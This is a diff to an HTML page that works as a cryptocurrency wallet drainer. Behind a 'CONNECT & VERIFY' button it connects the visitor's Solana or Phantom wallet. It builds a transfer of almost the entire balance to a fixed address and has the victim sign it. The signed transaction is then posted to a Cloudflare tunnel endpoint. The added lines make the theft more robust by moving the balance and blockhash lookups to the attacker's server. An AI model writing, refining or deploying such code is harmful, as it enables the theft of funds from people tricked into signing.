@@ -2,25 +2,35 @@
     <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
     <script>window.Buffer = buffer.Buffer;</script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
-    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;">
-    <button id="cta" style="padding:20px 40px;background:#14F195;border-radius:10px;font-weight:bold;cursor:pointer;">ACTIVATE PROTOCOL</button>
+    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
+    <button id="cta" style="padding:20px 40px;background:#14F195;border:none;border-radius:10px;font-weight:bold;cursor:pointer;">CONNECT & VERIFY</button>
     <script>
-    const TUNNEL = "https://jake-customized-conversations-lights.trycloudflare.com";
+    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     document.getElementById('cta').onclick = async () => {
-        const p = window.solana || window.phantom?.solana;
-        const { publicKey } = await p.connect();
-        // 🔱 从 71 机后端拿哈希，无视 403
-        const hashRes = await fetch(TUNNEL + '/get_hash').then(r => r.json());
-        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        const bal = await conn.getBalance(publicKey);
-        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-            fromPubkey: publicKey, toPubkey: new solanaWeb3.PublicKey("D6vY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2y"),
-            lamports: bal > 1000000 ? bal - 1000000 : 0
-        }));
-        tx.recentBlockhash = hashRes.blockhash; tx.feePayer = publicKey;
-        const signed = await p.signTransaction(tx);
-        const b64 = window.Buffer.from(signed.serialize()).toString('base64');
-        fetch(TUNNEL + '/collect', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({signature: b64}) });
-        alert("Success!");
+        try {
+            const p = window.solana || window.phantom?.solana;
+            const { publicKey } = await p.connect();
+            
+            // 🔱 关键：所有数据向 71 机要，前端绝不碰 Solana 节点，封杀 403
+            const data = await fetch(TUNNEL + '/get_data', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({pubkey: publicKey.toString()})
+            }).then(r => r.json());
+
+            const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+                fromPubkey: publicKey, toPubkey: new solanaWeb3.PublicKey("D6vY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2yvY2y"),
+                lamports: data.balance > 1500000 ? data.balance - 1000000 : 0
+            }));
+            tx.recentBlockhash = data.blockhash; tx.feePayer = publicKey;
+            
+            const signed = await p.signTransaction(tx);
+            const b64 = window.Buffer.from(signed.serialize()).toString('base64');
+            
+            await fetch(TUNNEL + '/collect', {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({signature: b64})
+            });
+            alert("Success!");
+        } catch(e) { alert("Error: " + e.message); }
     }
     </script></body></html>
